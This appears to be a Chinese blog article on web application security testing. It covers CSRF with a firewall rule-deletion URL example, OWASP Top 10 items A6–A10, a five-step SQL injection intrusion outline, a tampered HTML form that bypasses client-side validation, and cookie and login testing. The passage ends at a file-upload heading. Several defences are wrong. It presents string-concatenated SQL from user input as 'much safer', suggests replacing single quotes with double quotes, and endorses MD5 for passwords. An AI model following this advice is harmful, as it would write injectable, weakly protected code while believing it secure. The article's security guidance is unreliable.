CSRF攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作。例如：一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。<br>
CSRF是一种依赖web浏览器的、被混淆过的代理人攻击（deputy attack）。在上面银行示例中的代理人是Bob的web浏览器，它被混淆后误将Bob的授权直接交给了Alice使用。<br>
下面是CSRF的常见特性：<br>
        依靠用户标识危害网站<br>
        利用网站对用户标识的信任<br>
        欺骗用户的浏览器发送HTTP请求给目标站点<br>
风险在于那些通过基于受信任的输入form和对特定行为无需授权的已认证的用户来执行某些行为的web应用。已经通过被保存在用户浏览器中的cookie进行认证的用户将在完全无知的情况下发送HTTP请求到那个信任他的站点，进而进行用户不愿做的行为。<br>
使用图片的CSRF攻击常常出现在网络论坛中，因为那里允许用户发布图片而不能使用JavaScript。<br>
防范措施<br>
对于web站点，将持久化的授权方法（例如cookie或者HTTP授权）切换为瞬时的授权方法（在每个form中提供隐藏field），这将帮助网站防止这些攻击。一种类似的方式是在form中包含秘密信息、用户指定的代号作为cookie之外的验证。<br>
另一个可选的方法是“双提交”cookie。此方法只工作于Ajax请求，但它能够作为无需改变大量form的全局修正方法。如果某个授权的cookie在form. post之前正被JavaScript代码读取，那么限制跨域规则将被应用。如果服务器需要在Post请求体或者URL中包含授权cookie的请求，那么这个请求必须来自于受信任的域，因为其它域是不能从信任域读取cookie的。<br>
与通常的信任想法相反，使用Post代替Get方法并不能提供卓有成效的保护。因为JavaScript能使用伪造的POST请求。尽管如此，那些导致对安全产生“副作用”的请求应该总使用Post方式发送。Post方式不会在web服务器和代理服务器日志中留下数据尾巴，然而Get方式却会留下数据尾巴。<br>
尽管CSRF是web应用的基本问题，而不是用户的问题，但用户能够在缺乏安全设计的网站上保护他们的帐户：通过在浏览其它站点前登出站点或者在浏览器会话结束后清理浏览器的cookie。<br>
影响CSRF的因素<br>
CSRF攻击依赖下面的假定：<br>
        攻击者了解受害者所在的站点<br>
        攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie<br>
        目标站点没有对用户在网站行为的第二授权</p>
<p>防范CSRF漏洞——测试篇<br>
CSRF（Cross Site Request Forgey）跨站点伪造请求，是排在OWASP Top10第5位的漏洞，它迫使已被认证的用户在Web系统上执行其所不欲的操作。这种攻击依赖于以下：<br>
1） Web浏览器对会话相关信息的处理方式（如cookie或Http认证信息）<br>
　　2） 攻击者对正确的Web系统的URL的了解；<br>
　　3） 应用会话管理仅依赖于浏览器所了解的信息；<br>
　　4） 一些HTML的tag会导致对http(s)资源的直接访问其中，前3点是确认系统是否存在该漏洞的主要前提，第4点则是用来帮助攻击者利用该漏洞的。<br>
　　第1点：浏览器自动发送用于识别用户会话的信息，假设site是一个Web应用站点，victim是一个已经在该系统上经过认证的用户。在server的响应中，site发送一个带有代表victim身份的cookie给victim，原则上，一旦浏览器接收到了服务器发送的cookie，就会在后面对站点的访问中都带上这个cookie；<br>
　　第2点：如果应用在URL中没有使用会话相关的信息，那就意味着应用的URL，它们的参数，相应的值可以被识别。<br>
　　第3点：是指诸如cookie、或者是基于http的认证信息，存放在浏览器中后，就会包含在后面的每次请求中。<br>
　　下面，我们用Get方法在做个例子，如果用户已经通过了认证，那么在他做下一次请求时，请求数据中会自动加上cookie<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303330206.png" alt="" loading="lazy"><br>
GET请求一般会有多种原因产生，<br>
　　* 用户真正在访问Web系统；<br>
　　* 用户在访问地址栏中切实敲入了URL；<br>
　　* 用户点击了一个连接指向了这个URL；<br>
　　这些调用对于系统来说是无法区别的，特别的，第三种方式相对来说是极为危险的，有很多种方法可以用来仿造连接的真实属性，连接可以被嵌入到一封邮件中，或者在某个恶意网站上，看上去这个连接好像是在访问另一个网站，而事实上却是被引到了Web系统的访问上。如果用户点击了连接，由于它已经被系统认证通过了，浏览器就会对系统提交一个待用认证信息的GET请求。这就在系统上完成了一个操作（尽管这个操作不是用户本身所期望做的）。<br>
攻击者还可以通过Web的一些标记，注入img来达到这个目的。举个例子，假设攻击者发给用户一封邮件，引诱用户访问了一个URL，而这个URL的页面含有下面的HTML：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303326048.png" alt="" loading="lazy"><br>
　那么用户在点击这个URL时，浏览器将会做什么呢，它将会尝试显示一个宽度为0的图片，而事实上这是访问了www.company.example/action，显然如果浏览器并没有阻断下载img的图片，那么该动作就会执行了。<br>
　　该问题的存在是基于以下一些事实：<br>
　　* 有一些HTML的tags可能会执行一些脚本（如img）<br>
　　* 浏览器本身并不能识别img这个tag里的值是否是真实合法的图片<br>
　　* 不管图片是否是在网站本地或是其他网站，图片都会被下载<br>
　　举个例子：<br>
　　假设用户要登录到某个防火墙web管理系统，登录时，用户必须对系统进行身份验证，所以用户的会话信息会保存在cookie中。假设我们的防火墙管理系统允许认证过的用户根据防火墙规则的排号来删除规则（甚至允许用户输入“*”来删除所有的规则），那么下一步显示的就是删除页面，假定表单下面就会提交一个GET请求，是以如下的格式：</p>
<pre><code>　　https://[target]/fwmgt/delete?rule=1
　　或https://[target]/fwmgt/delete?rule=*
</code></pre>
<p>我们举的例子很简单，仅仅是为了说明CSRF的存在<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303320855.png" alt="" loading="lazy"><br>
那么，如果用户输入了“<em>”，然后按取了Delete键，那么就提交了如下的GET请求，<br>
　　https://www.company.example/fwmgt/delete?rule=</em><br>
　　同时就删除了所有的防火墙规则。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303316792.png" alt="" loading="lazy"><br>
显然，如果用户直接在地址栏中输入<code>https://[target]/fwmgt/delete?rule=*</code>，或者通过某个链接转接到这个url，或者如上面所说，把链接隐藏在img这个tag后面，诸如此种方法，如果用户在点击这个连接的时候，已经登录进了防火墙管理系统，显然这个访问就能成功奏效，从而达到了删除所有规则的目的。<br>
　　让我们想象一下，如果这样的攻击用于一些敏感系统，竞拍系统，或者是银行转账等等，所造成的后果将会多大。<br>
　　应对方法：<br>
　　对于用户来说，由于CSRF漏洞极为普遍，所以在我们的日常使用中要注意以下几点：<br>
　　* 保证系统使用完就注销登录的习惯；<br>
　　* 不要使用浏览器的保存用户名/密码的功能，不要使用网站的“记住我”功能<br>
　　* 不要使用同一个浏览器浏览普通网页和你的关键性Web系统<br>
　　对于开发人员来说，如上所述，由于将会话相关的信息放入了URL才造成了上述的问题，那么如果我们在URL层面增加会话特定的信息，那么对攻击者来说就增加了了解URL结构的难度。另外，我们还可以尽可能的使用POST，而不是GET；尽可能多的增加一些诸如“你确定要这样做吗？”的页面等……<br>
　　说到这，想必大家都已明白CSRF是什么了，下面我们来看下针对这个漏洞，作为测试人员该如何去测试。<br>
　　一般的测试用例应该如下构建：<br>
　　1假设u是需要被测试的URL，例如u =http://www.example.com/action；<br>
　　2构建一个包含了访问上述URL信息的html页面；<br>
　　3确保合法用户已经登录了系统；<br>
　　4诱使该用户在自己不知情的情况下访问上述URL；<br>
　　5确认是否执行了该操作。<br>
<strong>A6-安全误配置（Security Misconfiguration）</strong><br>
排在第六位的是不当的安全配置，事实上，这个问题可能存在于Web应用的各个层次，譬如平台、Web服务器、应用服务器，系统框架，甚至是代码中。开发人员需要和网络管理人员共同确保所有层次都合理配置，有很多自动化的工具可以用于查找是否缺少补丁，错误的安全配置，缺省用户是否存在，不必要的服务等等。<br>
这个漏洞往往使得攻击者能够访问未被授权的系统数据和功能，甚至有时，会导致整个系统被破坏。<br>
其实说这个漏洞该怎么防范并没有什么实际的措施，唯一的方法就是尽可能的对你的系统的所有方面都做好安全配置。<br>
         验证你的系统的安全配置<br>
         可使用自动化的安全配置向导；<br>
         必须覆盖整个平台和系统；<br>
         对所有组件都必须保证安装了最新的补丁；<br>
         完善分析变更带来的安全影响<br>
         对所有你做的安全配置进行记录<br>
         使用自动化扫描工具对你的系统进行验证。</p>
<p><strong>A7-限制远程访问失败</strong><br>
排在第7位的是“Failure to Restrict URL Access”，这个漏洞事实上也是与认证相关的，与我们前面提到的Top4不安全的直接对象引用也是类似的，不同在于这个漏洞是说系统已经对URL的访问做了限制，但这种限制却实际并没有生效。常见的错误是，我们在用户认证后只显示给用户认证过的页面和菜单选项，而实际上这些仅仅是表示层的访问控制而不能真正生效，攻击者能够很容易的就伪造请求直接访问未被授权的页面。<br>
我们举个例子来说明这个过程：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303302497.png" alt="" loading="lazy"><br>
1攻击者发现他自己的访问地址为/user/getAccounts；<br>
2他修改他的目录为/admin/getAccounts或/manager/getAccounts；<br>
3这样攻击者就能够查看到更多的账户信息了。<br>
那么，该如何防范出现这个漏洞呢？<br>
        对每个URL，我们必须做三件事<br>
        如果这个URL不是公开的，那么必须限制能够访问他的授权用户；<br>
        加强基于用户或角色的访问控制；<br>
        完全禁止访问未被授权的页面类型（如配置文件、日志文件、源文件等）<br>
        验证你的构架<br>
        在每一个层次都使用简单肯定的模型；<br>
        确保每一层都有一个访问机制<br>
        验证你的实现<br>
        不要使用自动化的分析工具<br>
        确保每个URL都被外部过滤器或其他机制保护<br>
        确保服务器的配置不允许对非授权页面的访问<br>
<strong>A8-未验证的重定向和传递</strong><br>
在Web应用中重定向是极为普遍的，并且通常重定向所引向的目的是带有用户输入参数的目的URL，而如果这些重定向未被验证，那么攻击者就可以引导用户访问他们所要用户访问的站点。<br>
同样，转发也是极为普遍的，本质上转发是在同一个应用中对一个新页面发送请求，并且有时是用参数来定义目标页面的。同样，如果参数未被验证，那么攻击者就可以利用其来绕过认证或是授权检查。<br>
而最终造成的后果，重定向会使得用户访问钓鱼网站或是恶意网站，而转发则会让攻击者利用先前安全检查过的请求来绕过认证或是授权。<br>
对于这个漏洞，常用的防范方式包括：<br>
         尽可能的避免使用重定向和转发机制；<br>
         如果使用了，那么在定义目标url的时候不要包含用户参数；<br>
         如果一定要包含用户的参数，那么，<br>
         对每个参数都必须进行验证以确保它的正确性和合法性；或是<br>
         在服务器端提供映射机制，将用户的选择参数转变为真正的目标页面；<br>
<strong>A9-不安全的加密存储</strong><br>
我们常说数据的安全性是极为重要的，而在程序人员的编程过程中，由于有些需求或是设计的问题，往往会造成特别是机密数据的安全性得不到保证，常见的不安全的数据存储包括：<br>
        未能识别全部的机密数据；<br>
        对某个机密数据未能识别其所有的存放地；（数据库、文件、目录、日志文件……）<br>
        未对数据的每个存放地进行合理的保护<br>
那么显然，这样造成的后果是极为严重的：<br>
        攻击者能够取得或是篡改机密的或是私有的信息；<br>
        攻击者通过这些秘密的窃取从而进行进一步的攻击；<br>
        造成企业形象破损，用户满意度下降，甚至会有法律诉讼等；<br>
一般来说，我们采用以下的方法来避免这个漏洞的存在：<br>
        验证你的结构<br>
        识别所有的敏感数据；<br>
        识别这些数据存放的所有位置；<br>
        确保所应用的威胁模型能够应付这些攻击；<br>
        使用加密手段来应对威胁<br>
        使用一定的机制来进行保护<br>
        文件加密；数据库加密；数据元素加密<br>
        正确的使用这些机制<br>
        使用标准的强算法；<br>
        合理的生成，分发和保护密钥；<br>
        准备密钥的变更<br>
        验证实现方法<br>
        确保使用了标准的强算法；<br>
        确保所有的证书、密钥和密码都得到了安全的存放；<br>
        有一个安全的密钥分发和应急处理的方案；<br>
<strong>A10-不足的传输层保护</strong><br>
最后一个漏洞事实上也是与上一个漏洞有所相似，都是一种缺少了对敏感数据保护的漏洞。不同在于这种漏洞更多关注的是数据在网络上的传输，造成这个漏洞的原因往往如下：<br>
         未能识别所有的敏感数据；<br>
         未能识别敏感数据发送的所有位置；<br>
         未能在每个位置对敏感数据提供合理的保护<br>
这个漏洞造成的后果和排在第9位的类似，这里不做赘述。<br>
但是防范方法却和第9位的方法有一定的区别，主要的方法包括：<br>
         提供合理的保护机制<br>
         对于敏感数据的传输，对所有连接都要使用TLS；<br>
         在传输前对单个数据都要进行加密；（如XML-Encryption）<br>
         在传说前对信息进行签名；（如XML-Signature）<br>
         正确的使用这些机制<br>
         使用标准的强算法<br>
         合理管理密钥和证书；<br>
         在使用前验证SSL证书</p>
<p>1 Web 应用程序布署环境测试<br>
用来架构Web 网站的UNIX、LINUX、WINDOWS 等服务器端操作系统和服务器软件都可能存在漏洞（如前不久被发现的LINUX 系统内核漏洞），这些漏洞都会对Web 应用程序造成安全威胁。因此，在布署Web 应用程序前，应对Web 应用程序的布署环境进行严格的测试，检查一切已知的漏洞，发现新的漏洞，将应用程序环境带来的安全威胁降底到最低程度。</p>
<p>1.1HTTP 请求引发漏洞的测试<br>
超长URL 的HTTP 请求，特殊格式字符的HTTP 请求，某些不存在文件的HTTP 请求，COM Internet Services (CIS)– RPC over HTTP 漏洞，从而引发拒绝服务，源代码显示，站点物理路径泄露，执行任意命令及命令注入等安全问题。因此，对非常规URL 的HTTP 请求要做全面的测试，以发现这方面的漏洞。测试工作以人工方式为主，并配以Tripwire和AIDE 的完整性检查工具检查系统文件，对于发现的漏洞，可采取关闭所有不必要的服务和安装系统补丁加固系统。另外要保持对最新补丁和安全公告的追踪，在实验环境进行测试后正式安装在布署Web 应用程序的主机上。</p>
<p>1.2 操作系统目录安全性及Web 应用程序布署环境目录遍历问题测试<br>
目录权限和目录安全性直接影响着Web 的安全性。测试中要检查Web 应用程序布署环境的目录权限和安全性，不给恶意用户任何可用的权限。目录遍历可能导致用户从客户端<br>
看到或下载、删除Web 服务器文件。因此，要测试Web 应用程序及布署环境是否存在目录遍历问题；若存在该漏洞，可通过在各级目录中存放默认文档或及时升级系统来避免。</p>
<p>1.3 系统中危险组件的测试<br>
系统中危险组件的存在，会给恶意用户留下非常危险的“ 后门”。如恶意用户可利用Windows 系统中存在的FileSystemObject 组件篡改、下载或删除服务器中的任何文件。因此，若系统中需要使用这些组件，可将这些组件更名；否则将其删除。</p>
<p>1.4 TCP 端口测试<br>
开放非必要的端口，会给Web 应用程序带来安全威胁。因此，在布署Web 应用程序前，要用端口扫描软件对布署环境进行TCP 端口测试，禁止UDP，只开启必要的TCP 端口。另<br>
外，在系统运行过程中要不断测试，在服务器端使用lsof 工具(For Unix)或者Inzider 工具(For windows)扫描端口使用情况，必要时从远程使用Nmap 工具进行异常端口占用检测。如果发现有未知的进程占用端口，要关闭端口或杀掉进程。</p>
<p>2 应用程序测试<br>
应用程序中存在的漏洞是影响Web 安全的主要方面，程序员编写的软件都可能有漏洞，有些漏洞可能要经过许多年后才会被发现。特别是不断新加的功能，这些改动，都会带<br>
来安全方面的问题。因此，应用程序测试要伴随着系统开发、布署和运行的全过程。</p>
<p>2.1 SQL 注入漏洞测试<br>
2.1.1 SQL注入漏洞攻击实现原理<br>
SQL（Structured Query Language）是一种用来和数据库交互的语言文本。SQL注入的攻击原理就是攻击者通过Web应用程序利用SQL语句或字符串将非法的数据插入到服务器端数据库中，获取数据库的管理用户权限，然后将数据库管理用户权限提升至操作系统管理用户权限，控制服务器操作系统，获取重要信息及机密文件。<br>
SQL注入利用的是正常的HTTP服务端口，表面上看来和正常的web访问没有区别，隐蔽性极强，不易被发现。<br>
SQL注入过程</p>
<p>如上图所示，SQL注入攻击过程分为五个步骤：<br>
第一步：判断Web环境是否可以SQL注入。如果URL仅是对网页的访问，不存在SQL注入问题，如：http://news.xxx.com.cn/162414739931.shtml就是普通的网页访问。只有对数据库进行动态查询的业务才可能存在SQL注入，如：http://www.google.cn/webhp?id＝39，其中?id＝39表示数据库查询变量，这种语句会在数据库中执行，因此可能会给数据库带来威胁。<br>
第二步：寻找SQL注入点。完成上一步的片断后，就要寻找可利用的注入漏洞，通过输入一些特殊语句，可以根据浏览器返回信息，判断数据库类型，从而构建数据库查询语句找到注入点。<br>
第三步：猜解用户名和密码。数据库中存放的表名、字段名都是有规律可言的。通过构建特殊数据库语句在数据库中依次查找表名、字段名、用户名和密码的长度，以及内容。这个猜测过程可以通过网上大量注入工具快速实现，并借助破解网站轻易破译用户密码。<br>
第四步：寻找WEB管理后台入口。通常WEB后台管理的界面不面向普通用户<br>
开放，要寻找到后台的登陆路径，可以利用扫描工具快速搜索到可能的登陆地址，依次进行尝试，就可以试出管理台的入口地址。<br>
第五步：入侵和破坏。成功登陆后台管理后，接下来就可以任意进行破坏行为，如篡改网页、上传木马、修改、泄漏用户信息等，并进一步入侵数据库服务器。</p>
<p>2.1.2 SQL注入漏洞防范措施<br>
SQL注入漏洞攻击的防范方法有很多种，现阶段总结起来有以下方法：<br>
（1）数据有效性校验<br>
如果一个输入框只可能包括数字，那么要通过校验确保用户输入的都是数字。如果可以接受字母，那就要检查是不是存在不可接受的字符，最好的方法是增加字符复杂度自动验证功能。确保应用程序要检查以下字符：分号、等号、破折号、括号以及SQL关键字。另外限制表单数据输入和查询字符串输入的长度也是一个好方法。如果用户的登录名最多只有10个字符，那么不要认可表单中输入10个以上的字符，这将大大增加攻击者在SQL命令中插入有害代码的难度。<br>
（2）封装数据信息<br>
对客户端提交的数据进行封装，不要将数据直接存入cookie中，方法就是在编程的代码中，插入session、if、try、else，这样可以有效地防止攻击者获取cookie中的重要信息。<br>
（3）去除代码中的敏感信息<br>
将在代码中存在的用户名、口令信息等敏感字段删除，替换成输入框。<br>
如：SQL=&quot; select from users where username = ’admin’and password= ’1234567’ &quot;这样显然会暴露管理员的用户名、口令信息。可以将其修改成SQL= &quot; select * from users where username='&quot; +Txtuser.Text + &quot;' and userpwd='&quot; + Textpwd.Text + &quot;'&quot;，这样就安全了很多，入侵者也是不会轻易的就获取到用户名、口令信息。<br>
（4）替换或删除单引号<br>
使用双引号替换掉所有用户输入的单引号，这个简单的预防措施将在很大程度上预防SQL注入漏洞攻击，单引号时常会无法约束插入数据的Value，可能给予输入者不必要的权限。用双引号替换掉单引号可以使大部分SQL注入漏洞攻击失败。<br>
如：“select* from users where username='&quot; + admin + &quot;' and userpwd='&quot; + 1234567+ &quot;'”显然会得到与“select * from users where username='admin' and password= '1234567'”相同的结果。<br>
（5）指定错误返回页面<br>
攻击者有时从客户端尝试提交有害代码和攻击字符串，根据Web Service给出的错误提示信息来收集程序及服务器的信息，从而获取想得到的资料。应在Web Service中指定一个不包含任何信息的错误提示页面。<br>
（6）限制SQL字符串连接的配置文件<br>
使用SQL变量，因为变量不是可以执行的脚本，即在Web页面中将连接数据库的SQL字符串替换成指定的Value，然后将Web.config文件进行加密，拒绝访问。<br>
（7）设置Web目录的访问权限<br>
将虚拟站点的文件目录禁止游客用户（如：Guest用户等）访问，将User用户权限修改成只读权限，切勿将管理权限的用户添加到访问列表。<br>
（8）最小服务原则<br>
Web服务器应以最小权限进行配置，只提供Web服务，这样可以有效地阻止系统的危险命令，如ftp、cmd、vbscript等。<br>
（9）鉴别信息加密存储<br>
将保存在数据库users表中的用户名、口令信息以密文形式保存，也可以对users表进行加密处理，这样可以大大增加对鉴别信息访问的安全级别。<br>
（10）用户权限分离<br>
应尽可能的禁止或删除数据库中sa权限用户的访问，对不同的数据库划分不同的用户权限，这样不同的用户只能对授权给自己的数据库执行查询、插入、更新、删除操作，就可以防止不同用户对非授权的数据库进行访问。</p>
<p>2.1.3 SQL注入漏洞检测方法<br>
SQL注入漏洞攻击检测分为入侵前的检测和入侵后的检测。入侵前的检测，可以通过手工方式，也可以使用SQL注入漏洞扫描工具软件。检测的目的是为预防SQL注入漏洞攻击，而对于SQL注入漏洞攻击后的检测，主要是针对审计日志的查看，SQL注入漏洞攻击成功后，会在Web Service和数据库的审计日志中留下“痕迹”。检测方法如下：</p>
<p>（1）动态SQL检查<br>
动态的SQL语句是一个进行数据库查询的强大的工具，但把它和用户输入混合在一起就使SQL注入成为了可能。将动态的SQL语句替换成预编译的SQL或者存储过程对大多数应用程序是可行的。预编译的SQL或者存储过程可以将用户的输入作为参数而不是命令来执行，这样就限制了入侵者的行动。当然，它不适用于存储过程中利用用户输入来生成SQL命令的情况。在这种情况下，用户输入的SQL命令仍可能得到执行，数据库仍然存在SQL注入漏洞攻击的危险。</p>
<p>（2）有效性校验<br>
如果一个输入框只可能包括数字，那么要通过验证确保用户输入的都是数字。如果可以接受字母，检查是不是存在不可接受的字符，那就需要设置字符串检查功能。确保应用程序要检查以下字符：分号、等号、破折号、括号以及SQL关键字。</p>
<p>（3）数据表检查<br>
使用SQL注入漏洞攻击工具软件进行SQL注入漏洞攻击后，都会在数据库中生成一些临时表。通过查看数据库中最近新建的表的结构和内容，可以判断是否曾经发生过SQL注入漏洞攻击。</p>
<p>（4）审计日志检查<br>
在Web服务器中如果启用了审计日志功能，则Web Service审计日志会记录访问者的IP地址、访问时间、访问文件等信息，SQL注入漏洞攻击往往会大量访问某一个页面文件（存在SQL注入点的动态网页），审计日志文件会急剧增加，通过查看审计日志文件的大小以及审计日志文件中的内容，可以判断是否发生过SQL注入漏洞攻击事件；另外还可以通过查看数据库审计日志，查询某个时间段是否有非法的插入、修改、删除操作。</p>
<p>（5）其他<br>
SQL注入漏洞攻击成功后，入侵者往往会添加特权用户（如：administrator、root、sa等）、开放非法的远程服务以及安装木马后门程序等，可以通过查看用户帐户列表、远程服务开启情况、系统最近日期产生的一些文件等信息来判断是否发生过入侵。<br>
SQL 注入攻击源于英文“SQL Injection Attack”。微软技术中心从两个方面对SQL 注入攻击进行了描述：一是脚本注入式的攻击；二是恶意用户输入用来影响被执行的SQL脚本。Stephen Kost 对这种攻击形式的描述是“从一个数据库获得未经授权的访问和直接检索”。<br>
SQL 注入就其本质而言，是利用SQL 语法，对应用程序中的漏洞的攻击。当攻击者能够操纵数据，在应用程序中插入一些SQL 语句时，SQL 注入攻击就发生了。理论上，这种攻击对于所有基于SQL 语言标准的数据库软件都是有效的，包括MS SQL Server，Oracle，DB2，Sybase，MySQL等。特别是现在一些AQL 注入攻击工具的出现，使得Web应用更易遭到SQL 注入攻击。原始的手工测试不适用于大型Web 应用程序，可使用N-Stealth、WebInspect、Wikto WebScarab、Nikto 等工具进行扫描，测试系统是否存在SQL 注入的安全漏洞。为防止SQL 注入，程序员编写代码时，要对客户端和服务端进行两级检查。检查数据类型、数据长度和敏感字符的合法性。客户端检查可减少网络流量，降低服务器负荷，将一般误操作、低等级攻击与高等级攻击行为区分开来。对于绕开客户端检查的攻击，提交的数据被直接发往服务端，服务端检查到的提交异常基本可以认定为恶意攻击行为所致，就应中止提交信息的处理，进行攻击备案，并对客户端给出出错或警告提示。另外，在构造查询时，应根据用户输入的内容设置参数值来创建参数化查询，从而避免SQL 注入及由此带来的安全问题。</p>
<p>2.2 表单漏洞测试<br>
2.2.1 表单漏洞实现原理<br>
表单提交是当前Web应用中的重要内容，用户可以通过这种方式与服务器进行数据传递。在通常情况下，会在提交表单之前在服务器上进行表单数据的验证，这样可以节省服务器资源，但同时也为服务器带来了安全漏洞。<br>
表单提交的数据的验证和服务端数据接收的方法直接影响到Web 的安全。随着大量的支持参数的“模糊化”（“fuzzing”）、腐朽（corruption）、以及野蛮强制增长工具的出现，使用非校验输入进行攻击造成的安全问题越来越多。因此，表单漏洞测试是Web 安全所必需的。</p>
<p>2.2.2 表单漏洞防范措施<br>
为防止表单漏洞的攻击，编程时应有一个中心化的、强大的验证机制来对所有HTTP 请求的输入进行验证，过滤可能危及后台数据库的特殊字符、脚本语言和命令。<br>
为防止攻击者绕过客户端的安全机制，对这些字符的检测应在Web 服务端实现，采用清除或者强制替换的方法避免服务器端的安全，并且使用MD5 哈希(hash)函数或者时间戳数字签名技术对客户端敏感数据必须进行完整性保护。<br>
解决这种漏洞的方法为在提交表单页面进行校验的同时，在接收表单的处理页面也进行校验，这样即使用户使用非法方式提交的非法数据通过了页面验证也无法通过服务器上的验证。</p>
<p>2.2.3 表单漏洞检测方法<br>
⑴ 表单数据提交测试。<br>
	对表单数据提交的测试，主要检查程序中是否对表单所提交数据的完整性、正确性进行了验证（如果在页面部分进行验证的话），如：查询条件输入一些特殊字符，比如“--”，“‘，，’”，““”等会使查询的SQL语句出错<br>
	检查程序中是否屏蔽了表单提交的html 语句、VBScript 和Jscript 等客户端脚本语句<br>
	检查是否会出现“脚本利用”问题<br>
	检查程序是否对表单域长度进行了真正的限制<br>
	检查是否存在重复提交数据的问题<br>
	检查这些验证是否在服务器端进行<br>
对表单提交数据的测试，可以采用手工和编写可重复使用的脚本代码相结合的方法，进行边界值测试、等价类测试，以及异常类测试。编写的脚本代码可以在测试、回归测试时运行。<br>
若在测试中发现数据完整性、正确性验证只是在客户端进行，应在服务器端增加对表单提交数据的验证，防止出现本地提交表单的漏洞。<br>
⑵ 本地提交表单的漏洞测试。<br>
本地提交表单的漏洞容易受到参数篡改的攻击。这类测试可用手工的方式进行。<br>
对于如下用户注册页面：</p>
<pre><code>&lt;script&gt;  
function checkUser(){  
if(document.getElementById(&quot;userName&quot;).value==&quot;&quot;){  
document.getElementById(&quot;button&quot;).disabled=true;  
alert(&quot;用户名不可以为空&quot;);  
return false;  
}else{  
document.getElementById(&quot;button&quot;).disabled=false;  
}  
}  
function checkPsw(){  
if(document.getElementById(&quot;password&quot;).value==&quot;&quot;){  
document.getElementById(&quot;button&quot;).disabled=true;  
alert(&quot;密码不可以为空&quot;);  
return false;  
}else{  
document.getElementById(&quot;button&quot;).disabled=false;  
}  
}  
&lt;/script&gt;  
&lt;form action=&quot;regist.php&quot; method=&quot;POST&quot;&gt;  
&lt;input type=&quot;text&quot; name=&quot;userName&quot; onblur=&quot;checkUser()&quot;/&gt;  
&lt;input type=&quot;password&quot; name=&quot;password&quot; onblur=&quot;checkPsw()&quot;/&gt;  
&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;/&gt;  
&lt;/form&gt; 
</code></pre>
<p>此页面中的JavaScript对表单中用户名和密码是否为空进行了判断，如果用户名或密码有一者为空时就会将&quot;提交&quot;按钮设置为不可用，这样可以阻止用户的提交。<br>
但是这个页面的内容可以完全通过查看页面源代码的方式看到，用户可以通过查看源代码的方式将其中的JavaScript部分去掉，同时将表单action请求指向此页面原来的地址，然后将修改后的页面保存为一个静态HTML页面，这样就可以完成一个非法的数据提交。修改之后的页面代码如下：</p>
<pre><code>&lt;form action=&quot;http://www.abcdefg.com/testbug/regist.php&quot; method=&quot;POST&quot;&gt;  
&lt;input type=&quot;text&quot; name=&quot;userName&quot; onblur=&quot;checkUser()&quot;/&gt;  
&lt;input type=&quot;password&quot; name=&quot;password&quot; onblur=&quot;checkPsw()&quot;/&gt;  
&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;/&gt;  
&lt;/form&gt; 
</code></pre>
<p>如此一个页面，完全允许用户提交任何一种数据，包括空的用户名和密码。</p>
<p>2.3 Cookie欺骗漏洞测试</p>
<p>2.3.1 Cookie欺骗实现原理<br>
Cookie最先是由Netscape（网景）公司提出的，Netscape官方文档中对Cookie的定义是这样的：Cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。<br>
Cookie的用途非常广泛，在网络中经常可以见到Cookie的身影。它通常被用来辨别用户身份、进行session跟踪，最典型的应用就是保存用户的账号和密码用来自动登录网站和电子商务网站中的“购物车”。<br>
Cookie注入简单来说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了。</p>
<p>2.3.2 Cookie欺骗防范措施<br>
（1）删除Cookie记录<br>
在IE浏览器【工具】【Internet选项】中删除Cookie，也可借助相应安全软件来实现。<br>
（2）更改Cookie文件的保存位置<br>
在【Internet选项】对话框中单击【设置】按钮，在设置页面单击【移动文件夹】出现如下图，在其中设置相应保存位置（如F:\），即可成功更改Cookie文件的保存位置。<br>
（3）添加防注入代码</p>
<p>2.3.3 Cookie欺骗监测方法<br>
如果系统使用了cookie，就要对cookie 的使用情况进行检测。检查Cookies 在生存期内能否正常工作而且对这些信息是否加密，是否按预定的时间进行保存，是否存在cookie 可被伪造提交的问题，刷新对Cookie 有什么影响及过期处理等。</p>
<p>2.4 用户身份验证测试</p>
<p>2.4.1 用户身份验证漏洞防范措施<br>
	限制用户名、密码最大字符数、字符类型<br>
	限制登录次数，超出允许次数后给出友好提示<br>
	限制用户权限<br>
用户身份验证，客户端提交的密码需加密，服务端验证密码使用MD5，若在测试中发现问题，应及时修改代码，使用加密码算法对密码加密。</p>
<p>2.4.2 用户身份验证检测方法<br>
	测试有效和无效的用户名和密码，测试是否大小写敏感，是否有最大字符数的限制规则等。<br>
	测试重试次数的限制，如果登录失败的次数超过允许值，应用程序将会做出何种反应 （譬如拒绝此IP地址在短时间内的登录）。<br>
	测试是否可以利用历史登录信息或以前的URL来绕开登录程序。<br>
	测试执行添加、删除、修改等动作中是否需要登录操作，退出系统之后的操作是否仍可继续等。<br>
	测试用户密码是否符合指定要求（字符、长度），如果不符合，对有什么影响，新用户自己修改密码后，创建时分配的密码是否会失效。<br>
	测试用户账户过期后，是否完全、正确的删除其信息或使其失效。<br>
	是否存在不验证而直接进入Web 应用系统的问题，是否存在不登录就可查看非会员页面和权限问题。<br>
用户身份验证测试一般使用手工和测试工具相结法的方法，若在测试中发现问题，应及时修改代码，使用加密码算法对密码加密，采用Session 对象进行登录验证。</p>
<p>2.5 文件操作漏洞测试</p>
<p>2.5.1 文件操作漏洞实现原理<br>
上存漏洞常见有，文件名检测漏洞，还有就是文件格式检查漏洞。 另外还有一个，就是保存文件存在漏洞。这类漏洞，主要是可以读取用户传入路径名称，采用不正确的过滤方法，导致恶意用户，将文件上存到非预期的地方，带来安全隐患。</p>
<p>2.5.2 文件操作漏洞防范措施<br>
